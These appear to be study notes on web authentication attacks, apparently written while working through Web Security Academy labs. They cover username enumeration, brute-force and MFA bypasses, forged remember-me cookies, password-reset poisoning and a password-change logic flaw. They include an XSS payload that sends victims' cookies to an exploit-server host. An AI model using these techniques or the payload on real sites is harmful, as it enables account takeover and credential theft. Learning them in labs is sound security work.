# Authentication attacks
## Password-based
Analyze responses and content-length when trying to determine username. We can detect correct username without knowing correct password, which will decrease brute-force attempts  
Also check response messages (with grep in Intruder settings). For example app can throw "Invalid username or password" or just "Invalid password"  
Some systems could be protected from brute-forcing via IP whitelisting. It could be bypassed if we have control over X-Forwarded-For parameter in HTTP request  
Another brute-force protection flaw - reseting IP blocking after successfull login. So if we brute and stuck with blocked IP, we can login with valid creds and then continue attack.  
We need to count how much incorrect attempts are allowed and then log in with valid creds. This could be done with Turbo Intruder or macro extension.  
Another way of protection - account locking.  
We can choose small amount of opasswords and bruteforce usernames for this passwords, so we have vice-versa brute-forcing with goal to obtain at least just one account with common password.  
Some apps could be vulnerable to sending multiple credentials at once:
```
"username" : "carlos",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
```
## MFA
If verification step is done on separate tab, you can see that user is in "logged in" state  
So you can try to access forbidden pages after logging with valid creds without entering MFA token, simply bypassing it.  
  
Another way is to use victim's cookie in verification step. We login at our own account, but on verification step we cahnge our cookie to victim's cookie and in such way we are able to get in victim's account even without it's password.  
Also this method involves brute-forcing of 2FA code  
Sometimes 2FA is protected from bruteforce, but we can bypass it using burp macro  
Settings - Projects - Sessions - Add rule - Add macro - record macro  
Our macro could be
```
GET /login
POST /login
GET /login2
```
Set this amcro to all URL's (in Scope tab). Now we start bruteforce POST request to /login2 (MFA). WIth use of macro, each our request will be "surrounded" by relogin attempts which will help us to bypass 2FA.  

## Other auth issues
### Remember me
Stored sessions (remember me) are often implemented with "remember-me" cookie. If they are easily guessable or poorly encrypred, we can generate our own cookie in order to gain access over victim's account.  
Such cookies could have some obfuscation  
Example:  
carlos:<md5 hash>  
In such situation we add rules at intruder (and password wordlist): hash MD5, add prefix carlos: and encode as base64  

### Remember-me + XSS
We can put XSS into comments section to steal someone cookie and then decode it from ahsh:
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```
Note: we can use crackstation to decode hashes

### Password reset
In insecure URL design we are able to change some parameters to change password
```
http://vulnerable-website.com/reset-password?user=victim-user
```
If site sues tokens in place of suer parameter, we can check if it's handled securely. It must be deleted after short period of time, or we will be able to steal this token and use it to change someone's password  

We can steal password reset token via poisoning X-Forwarded-Host parameter.  
If we add Header X-Forwarded-Host with our exploit server when resetting password and change our username to victim's (in payload), victim will click to the link and send token to us.

### Password change
If we can access to change password page directly, we can bruteforce password from there.
Also some broken logic will help. For example if we enter correct current password and two non-matching new passwords, app wil throw error "passwords do not match". But if we enter incorrect current password, it says "incorrect password". With help of rhis we can brute via payload containing unmatching new passwords and receive lot of errors like "incorrect password" until we detect "passwords doesn't match".  

